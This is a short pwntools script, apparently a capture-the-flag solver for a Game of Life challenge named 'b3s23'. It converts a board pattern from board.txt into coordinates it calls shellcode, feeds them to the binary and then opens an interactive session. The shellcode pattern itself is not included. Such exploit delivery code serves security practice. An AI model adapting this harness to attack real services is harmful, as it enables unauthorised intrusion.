import re
from pwn import *

f = open('board.txt')
s = f.read()

rows = s.split('\n')
coords = [[(a.start(),i) for a in re.finditer('x', rows[i])] for i in range(len(rows))]
flatcoords = reduce(lambda x,y: x+y, coords)
shellcode = "".join(["{},{}\n".format(x, y) for x, y in flatcoords])
f2 = open("in.txt", 'w')
f2.write(shellcode)
f2.close()

tube = process("./b3s23")
#tube = remote("b3s23_28f1ea914f8c873d232da030d4dd00e8.quals.shallweplayaga.me", 2323)
for (x,y) in flatcoords:
    tube.writeline('{},{}'.format(x,y))

tube.writeline('lol')

for i in range(15):
    tube.recvuntil('01110001000111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')

tube.interactive()


